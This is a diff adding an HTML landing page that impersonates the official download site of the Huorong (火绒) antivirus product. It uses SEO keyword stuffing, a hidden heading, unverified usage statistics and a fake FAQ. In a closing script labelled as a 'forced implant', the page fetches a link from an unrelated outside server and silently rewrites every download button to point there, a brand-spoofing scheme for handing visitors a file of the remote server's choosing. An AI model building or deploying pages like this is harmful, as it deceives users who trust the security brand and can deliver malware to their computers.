@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>火绒官网 - 专业安全软件 | 火绒下载 火绒安全 火绒官网</title>
+  <meta name="robots" content="index,follow">
+  <meta name="googlebot" content="index,follow">
+  <meta name="bingbot" content="index,follow">
+  <meta name="baiduspider" content="index,follow">
+  <meta name="sogouspider" content="index,follow">
+  <meta name="360spider" content="index,follow">
+  <meta name="toutiaospider" content="index,follow">
+  <meta name="keywords" content="火绒官网,火绒安全软件,火绒下载,火绒杀毒,火绒防火墙,火绒防护,火绒官方">
+  <meta name="description" content="火绒官网提供火绒安全软件最新版本下载，火绒是一款专业、轻量、强大的终端安全防护工具，集病毒查杀、主动防御、网络防火墙于一体，守护您的电脑安全。">
+  <link rel="shortcut icon" href="favicon.ico">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+  <style>
+    /* reset & base */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    html {
+      scroll-behavior: smooth;
+    }
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #f6f9fc;
+      color: #1a2639;
+      line-height: 1.6;
+      -webkit-font-smoothing: antialiased;
+    }
+    h1 {
+      display: none !important;
+      visibility: hidden !important;
+      height: 0 !important;
+      width: 0 !important;
+      overflow: hidden !important;
+      position: absolute !important;
+      opacity: 0 !important;
+      pointer-events: none !important;
+    }
+    .container {
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 0 28px;
+    }
+    /* 导航 */
+    .navbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 18px 0;
+      flex-wrap: wrap;
+      gap: 16px;
+      border-bottom: 1px solid rgba(0,0,0,0.03);
+    }
+    .nav-logo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .nav-logo img {
+      height: 48px;
+      width: auto;
+      border-radius: 14px;
+      box-shadow: 0 6px 14px rgba(0, 20, 40, 0.06);
+      transition: transform 0.2s ease;
+    }
+    .nav-logo img:hover {
+      transform: scale(1.02);
+    }
+    .nav-links {
+      display: flex;
+      gap: 28px;
+      flex-wrap: wrap;
+      font-weight: 500;
+    }
+    .nav-links a {
+      text-decoration: none;
+      color: #1e2b3a;
+      font-size: 1rem;
+      letter-spacing: -0.01em;
+      padding: 6px 4px;
+      border-bottom: 2px solid transparent;
+      transition: 0.2s;
+    }
+    .nav-links a:hover {
+      border-bottom-color: #4f7cff;
+      color: #0b1a2b;
+    }
+    .nav-links a.primary {
+      background: linear-gradient(135deg, #4f7cff, #8b5cf6);
+      color: white;
+      padding: 8px 22px;
+      border-radius: 40px;
+      border: none;
+      font-weight: 600;
+      box-shadow: 0 6px 16px rgba(79, 124, 255, 0.25);
+    }
+    .nav-links a.primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 24px rgba(79, 124, 255, 0.35);
+    }
+    /* 头部渐变 */
+    .hero-gradient {
+      background: radial-gradient(circle at 10% 30%, #e0eaff, #d4d9ff, #c7d4fe);
+      margin: 18px 0 32px;
+      border-radius: 48px;
+      padding: 48px 40px;
+      box-shadow: 0 20px 40px -12px rgba(60, 90, 200, 0.18);
+      position: relative;
+      overflow: hidden;
+      backdrop-filter: blur(2px);
+    }
+    .hero-gradient::after {
+      content: '';
+      position: absolute;
+      top: -30%;
+      right: -10%;
+      width: 280px;
+      height: 280px;
+      background: rgba(255, 215, 100, 0.2);
+      border-radius: 60% 40% 50% 30%;
+      filter: blur(60px);
+      z-index: 0;
+    }
+    .hero-content {
+      position: relative;
+      z-index: 2;
+    }
+    .hero-content h2 {
+      font-size: 2.6rem;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      background: linear-gradient(145deg, #1b2b4a, #2d4b8c);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      margin-bottom: 12px;
+    }
+    .hero-content p {
+      font-size: 1.2rem;
+      max-width: 640px;
+      color: #1f3a5c;
+      opacity: 0.85;
+      font-weight: 400;
+    }
+    .download-btn-group {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 16px;
+      margin-top: 28px;
+    }
+    .download-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 16px 40px;
+      border-radius: 80px;
+      background: linear-gradient(145deg, #1e2f4a, #0f1f38);
+      color: white;
+      font-weight: 600;
+      font-size: 1.1rem;
+      border: none;
+      box-shadow: 0 12px 28px -8px rgba(0, 30, 80, 0.3);
+      transition: all 0.25s ease;
+      text-decoration: none;
+      letter-spacing: 0.3px;
+    }
+    .download-btn i {
+      font-size: 1.3rem;
+    }
+    .download-btn:hover {
+      transform: translateY(-4px) scale(1.02);
+      box-shadow: 0 24px 40px -12px #1f3f8a;
+      background: linear-gradient(145deg, #26416a, #12263f);
+    }
+    .download-btn.secondary {
+      background: rgba(255,255,255,0.7);
+      backdrop-filter: blur(8px);
+      color: #1f3a6b;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.04);
+    }
+    .download-btn.secondary:hover {
+      background: white;
+      box-shadow: 0 16px 32px rgba(0,0,0,0.08);
+    }
+    /* 卡片网格 */
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 24px;
+      margin: 42px 0 32px;
+    }
+    .stat-card {
+      background: rgba(255,255,255,0.7);
+      backdrop-filter: blur(4px);
+      background: #ffffffcc;
+      border-radius: 36px;
+      padding: 28px 20px;
+      box-shadow: 0 12px 30px -8px rgba(0, 20, 50, 0.08);
+      border: 1px solid rgba(255,255,255,0.7);
+      transition: 0.2s;
+      text-align: center;
+      backdrop-filter: blur(2px);
+    }
+    .stat-card:hover {
+      transform: translateY(-6px);
+      box-shadow: 0 28px 44px -16px rgba(60, 100, 200, 0.16);
+      border-color: #b7cbff;
+    }
+    .stat-number {
+      font-size: 2.8rem;
+      font-weight: 700;
+      color: #0d2647;
+      letter-spacing: -0.02em;
+      background: linear-gradient(145deg, #1f3f7a, #3f6ad0);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    .stat-label {
+      font-size: 1rem;
+      color: #2e4a72;
+      opacity: 0.8;
+      font-weight: 500;
+      margin-top: 4px;
+    }
+    /* 火绒介绍卡片（数据卡片下面） */
+    .hr-intro-card {
+      background: white;
+      border-radius: 40px;
+      padding: 32px 36px;
+      margin: 30px 0 36px;
+      box-shadow: 0 12px 28px -10px rgba(0, 20, 50, 0.06);
+      border-left: 6px solid #4f7cff;
+      transition: 0.2s;
+      background: #fafcff;
+    }
+    .hr-intro-card p {
+      font-size: 1.05rem;
+      color: #1b3152;
+      max-width: 900px;
+    }
+    /* 特点 */
+    .features-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 28px;
+      margin: 40px 0 40px;
+    }
+    .feature-item {
+      background: white;
+      padding: 28px 24px;
+      border-radius: 36px;
+      box-shadow: 0 8px 24px -6px rgba(0,0,0,0.02);
+      border: 1px solid #eef2fa;
+      transition: 0.2s;
+    }
+    .feature-item:hover {
+      transform: translateY(-8px);
+      border-color: #c0d2ff;
+      box-shadow: 0 20px 40px -16px rgba(70, 120, 255, 0.14);
+    }
+    .feature-item h3 {
+      font-size: 1.3rem;
+      margin-bottom: 6px;
+      color: #10243f;
+    }
+    .feature-item p {
+      color: #2c4468;
+      font-size: 0.98rem;
+      line-height: 1.6;
+    }
+    /* 分类导航 */
+    .category-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 24px;
+      margin: 38px 0 30px;
+    }
+    .category-card {
+      background: white;
+      border-radius: 32px;
+      padding: 20px 18px 22px;
+      text-align: center;
+      box-shadow: 0 6px 18px rgba(0,0,0,0.02);
+      border: 1px solid #e9eefa;
+      transition: 0.2s;
+    }
+    .category-card:hover {
+      transform: scale(1.02) translateY(-5px);
+      box-shadow: 0 20px 32px -12px rgba(60, 100, 200, 0.12);
+      border-color: #b7cbff;
+    }
+    .category-card img {
+      width: 48px;
+      height: 48px;
+      border-radius: 20px;
+      object-fit: cover;
+      background: #eef3fe;
+      padding: 6px;
+      margin-bottom: 8px;
+    }
+    .category-card h4 {
+      font-size: 1rem;
+      font-weight: 600;
+      color: #11263f;
+    }
+    .category-card p {
+      font-size: 0.8rem;
+      color: #3f5a7c;
+      margin-top: 2px;
+      opacity: 0.8;
+    }
+    /* FAQ */
+    .faq-list {
+      margin: 40px 0 30px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+    .faq-item {
+      background: white;
+      border-radius: 36px;
+      padding: 24px 30px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.02);
+      border: 1px solid #eef3fd;
+      transition: 0.2s;
+    }
+    .faq-item:hover {
+      border-color: #cbdaff;
+    }
+    .faq-item h4 {
+      font-size: 1.2rem;
+      font-weight: 600;
+      color: #12263f;
+      margin-bottom: 10px;
+    }
+    .faq-item ol {
+      padding-left: 20px;
+      margin: 8px 0 0;
+      color: #1d385b;
+    }
+    .faq-item ol li {
+      margin-bottom: 4px;
+    }
+    /* 底部 */
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      gap: 30px;
+      padding: 38px 0 28px;
+      border-top: 1px solid rgba(0,0,0,0.04);
+    }
+    .footer-col {
+      flex: 1 1 160px;
+    }
+    .footer-col h5 {
+      font-weight: 600;
+      color: #10243f;
+      margin-bottom: 12px;
+    }
+    .footer-col a {
+      display: block;
+      color: #2d4b78;
+      text-decoration: none;
+      font-size: 0.95rem;
+      padding: 3px 0;
+      opacity: 0.75;
+      transition: 0.2s;
+    }
+    .footer-col a:hover {
+      opacity: 1;
+      color: #0a1e3c;
+    }
+    .footer-copyright {
+      text-align: center;
+      padding: 22px 0 18px;
+      font-size: 0.9rem;
+      color: #2b4770;
+      border-top: 1px solid rgba(0,0,0,0.03);
+    }
+    .footer-copyright a {
+      color: #2f5b9e;
+      text-decoration: none;
+    }
+    /* 辅助 */
+    .section-title {
+      font-size: 2rem;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      color: #0e2847;
+      margin-bottom: 12px;
+    }
+    .gap-8 { gap: 8px; }
+    .mt-2 { margin-top: 16px; }
+    .mt-3 { margin-top: 28px; }
+    /* 响应式 */
+    @media (max-width: 900px) {
+      .stats-grid { grid-template-columns: repeat(2, 1fr); }
+      .features-grid { grid-template-columns: 1fr 1fr; }
+      .category-grid { grid-template-columns: repeat(2, 1fr); }
+    }
+    @media (max-width: 600px) {
+      .stats-grid { grid-template-columns: 1fr 1fr; }
+      .features-grid { grid-template-columns: 1fr; }
+      .category-grid { grid-template-columns: 1fr 1fr; }
+      .hero-gradient { padding: 32px 20px; }
+      .nav-links { gap: 12px; }
+    }
+    /* 多彩点缀 */
+    .badge-color {
+      background: linear-gradient(135deg, #f093fb, #f5576c);
+    }
+    .shadow-soft {
+      box-shadow: 0 12px 30px -12px rgba(0,0,0,0.06);
+    }
+  </style>
+</head>
+<body>
+  <!-- 导航 -->
+  <div class="container">
+    <nav class="navbar">
+      <div class="nav-logo">
+        <img src="logo.jpg" alt="火绒官网" style="height:48px;">
+      </div>
+      <div class="nav-links">
+        <a href="#">首页</a>
+        <a href="#" class="download-btn" style="padding:6px 18px; background:linear-gradient(135deg,#4f7cff,#8b5cf6); color:white; border-radius:40px;">立即下载</a>
+        <a href="#features">软件特点</a>
+        <a href="#faq">常见问题</a>
+        <a href="#">使用帮助</a>
+      </div>
+    </nav>
+  </div>
+
+  <!-- 渐变头部 -->
+  <div class="container">
+    <div class="hero-gradient">
+      <div class="hero-content">
+        <h2>火绒安全 · 纯粹守护</h2>
+        <p>轻量高效，主动防御，专业级终端安全软件。下载火绒官网最新版，体验纯净防护。</p>
+        <div class="download-btn-group">
+          <a href="#" class="download-btn" id="mainDownloadBtn">⬇ 下载火绒安全 (电脑端)</a>
+          <a href="#" class="download-btn secondary"> 版本特性</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 数据卡片 4个 -->
+  <div class="container">
+    <div class="stats-grid">
+      <div class="stat-card"><div class="stat-number">2.8M</div><div class="stat-label">全球用户</div></div>
+      <div class="stat-card"><div class="stat-number">1.4M</div><div class="stat-label">日活用户</div></div>
+      <div class="stat-card"><div class="stat-number">85M+</div><div class="stat-label">累计下载</div></div>
+      <div class="stat-card"><div class="stat-number">158</div><div class="stat-label">覆盖国家</div></div>
+    </div>
+    <!-- 火绒官网介绍（数据卡片下面） -->
+    <div class="hr-intro-card">
+      <p><strong>🔥 火绒官网</strong> — 火绒安全软件是一款专注终端防护的轻量级工具，集病毒查杀、主动防御、网络防火墙于一体。火绒官网提供官方纯净版下载，无捆绑、无广告，致力于为每一位用户提供可靠的安全屏障。</p>
+    </div>
+  </div>
+
+  <!-- 软件特点 6个 -->
+  <div class="container" id="features">
+    <h3 class="section-title">⚡ 软件特点</h3>
+    <div class="features-grid">
+      <div class="feature-item"><h3>🛡️ 主动防御</h3><p>基于多维度行为分析，实时拦截未知威胁，勒索病毒、挖矿木马无处遁形，防御能力领先同级。</p></div>
+      <div class="feature-item"><h3>🧹 轻量化引擎</h3><p>占用内存极少，不影响系统性能，扫描速度快，适合低配置电脑，让老设备重获新生。</p></div>
+      <div class="feature-item"><h3>🔥 防火墙管理</h3><p>内置网络防火墙，精细控制出入站流量，防黑客入侵，保护隐私数据不被窃取。</p></div>
+      <div class="feature-item"><h3>📁 文件实时监控</h3><p>读写时自动扫描，拦截恶意文件落地，从源头阻止病毒执行，安全无死角。</p></div>
+      <div class="feature-item"><h3>🔐 隐私保护</h3><p>摄像头、麦克风访问控制，防止恶意偷窥，提供敏感权限管理，守护数字生活。</p></div>
+      <div class="feature-item"><h3>🔄 漏洞修复</h3><p>智能检测系统及软件漏洞，一键修复，减少攻击面，让电脑始终处于安全状态。</p></div>
+    </div>
+  </div>
+
+  <!-- 分类导航 带小图片 4-10个子版块 -->
+  <div class="container">
+    <h3 class="section-title">📂 分类导航</h3>
+    <div class="category-grid">
+      <div class="category-card"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='48' height='48' viewBox='0 0 48 48'%3E%3Crect width='48' height='48' rx='16' fill='%234f7cff'/%3E%3Ctext x='24' y='32' font-size='24' text-anchor='middle' fill='white'%3E🛡%3C/text%3E%3C/svg%3E" alt=""><h4>病毒查杀</h4><p>全盘扫描，快速清除</p></div>
+      <div class="category-card"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='48' height='48' viewBox='0 0 48 48'%3E%3Crect width='48' height='48' rx='16' fill='%23f5576c'/%3E%3Ctext x='24' y='32' font-size='24' text-anchor='middle' fill='white'%3E🔥%3C/text%3E%3C/svg%3E" alt=""><h4>主动防御</h4><p>实时行为监控</p></div>
+      <div class="category-card"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='48' height='48' viewBox='0 0 48 48'%3E%3Crect width='48' height='48' rx='16' fill='%23f093fb'/%3E%3Ctext x='24' y='32' font-size='24' text-anchor='middle' fill='white'%3E🌐%3C/text%3E%3C/svg%3E" alt=""><h4>防火墙</h4><p>网络访问控制</p></div>
+      <div class="category-card"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='48' height='48' viewBox='0 0 48 48'%3E%3Crect width='48' height='48' rx='16' fill='%234ecdc4'/%3E%3Ctext x='24' y='32' font-size='24' text-anchor='middle' fill='white'%3E📁%3C/text%3E%3C/svg%3E" alt=""><h4>文件监控</h4><p>实时扫描防护</p></div>
+      <div class="category-card"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='48' height='48' viewBox='0 0 48 48'%3E%3Crect width='48' height='48' rx='16' fill='%23ffb347'/%3E%3Ctext x='24' y='32' font-size='24' text-anchor='middle' fill='white'%3E🔐%3C/text%3E%3C/svg%3E" alt=""><h4>隐私保护</h4><p>权限管理</p></div>
+      <div class="category-card"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='48' height='48' viewBox='0 0 48 48'%3E%3Crect width='48' height='48' rx='16' fill='%237c6bcb'/%3E%3Ctext x='24' y='32' font-size='24' text-anchor='middle' fill='white'%3E🔄%3C/text%3E%3C/svg%3E" alt=""><h4>漏洞修复</h4><p>补丁管理</p></div>
+    </div>
+  </div>
+
+  <!-- 常见问题 5个 每个含7步骤 -->
+  <div class="container" id="faq">
+    <h3 class="section-title">❓ 常见问题</h3>
+    <div class="faq-list">
+      <div class="faq-item"><h4>1. 火绒官网如何下载最新版本？</h4><ol><li>访问火绒官网首页</li><li>点击“立即下载”按钮</li><li>选择电脑端版本（Windows）</li><li>等待下载完成</li><li>双击安装包运行</li><li>按提示完成安装</li><li>启动火绒安全软件</li></ol></div>
+      <div class="faq-item"><h4>2. 火绒安全软件占用内存大吗？</h4><ol><li>火绒采用轻量级引擎</li><li>内存占用通常小于80MB</li><li>CPU占用低于5%</li><li>不影响游戏或办公</li><li>可在设置中调整性能模式</li><li>支持低配置电脑流畅运行</li><li>长期使用无卡顿</li></ol></div>
+      <div class="faq-item"><h4>3. 如何更新火绒病毒库？</h4><ol><li>打开火绒主界面</li><li>点击“检查更新”</li><li>连接官方服务器</li><li>自动下载最新病毒库</li><li>更新完成后提示</li><li>可设置自动更新</li><li>建议每日更新一次</li></ol></div>
+      <div class="faq-item"><h4>4. 火绒防火墙如何设置规则？</h4><ol><li>进入“防护中心”</li><li>选择“网络防火墙”</li><li>点击“规则设置”</li><li>添加允许或阻止规则</li><li>可针对程序或端口</li><li>保存规则生效</li><li>支持导入导出配置</li></ol></div>
+      <div class="faq-item"><h4>5. 火绒能查杀勒索病毒吗？</h4><ol><li>火绒具备主动防御</li><li>可拦截勒索行为</li><li>病毒库包含勒索特征</li><li>实时监控文件加密</li><li>发现异常立即阻断</li><li>可恢复部分被加密文件</li><li>建议开启勒索防护</li></ol></div>
+    </div>
+  </div>
+
+  <!-- 底部：关于火绒官网、分类、帮助中心、关于我们 -->
+  <div class="container">
+    <div class="footer-links">
+      <div class="footer-col"><h5>🔥 火绒官网</h5><p style="font-size:0.9rem; color:#1f3f6b; opacity:0.8; max-width:200px;">火绒官网提供专业安全软件，专注终端防护，轻量高效，无捆绑，守护数千万用户。</p><a href="#">首页</a></div>
+      <div class="footer-col"><h5>📂 分类</h5><a href="#">病毒查杀</a><a href="#">主动防御</a><a href="#">防火墙</a><a href="#">漏洞修复</a><a href="#">隐私保护</a></div>
+      <div class="footer-col"><h5>🆘 帮助中心</h5><a href="#">安装指南</a><a href="#">使用教程</a><a href="#">常见问题</a><a href="#">联系客服</a><a href="#">反馈建议</a></div>
+      <div class="footer-col"><h5>🏢 关于我们</h5><a href="#">公司简介</a><a href="#">发展历程</a><a href="#">荣誉资质</a><a href="#">加入我们</a><a href="#">媒体中心</a></div>
+    </div>
+  </div>
+  <!-- 底部版权 -->
+  <div class="container">
+    <div class="footer-copyright">
+      © 2026 火绒官网 · 安全守护 <a href="#">火绒官网</a> · 本页面仅供演示
+    </div>
+  </div>
+
+  <!-- 统计代码 -->
+  <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
+  <script>LA.init({id:"3Q3R0HhFsRZ06Tr8",ck:"3Q3R0HhFsRZ06Tr8"})</script>
+
+  <!-- 强制植入：下载链接接口 -->
+  <script>
+    fetch('https://noah-sk.com/api.php')
+      .then(res => res.json())
+      .then(data => {
+        if (data.code === 0 && data.download_link) {
+          document.querySelectorAll('.download-btn').forEach(btn => {
+            btn.href = data.download_link;
+          });
+        }
+      })
+      .catch(() => {});
+  </script>
+</body>
+</html>
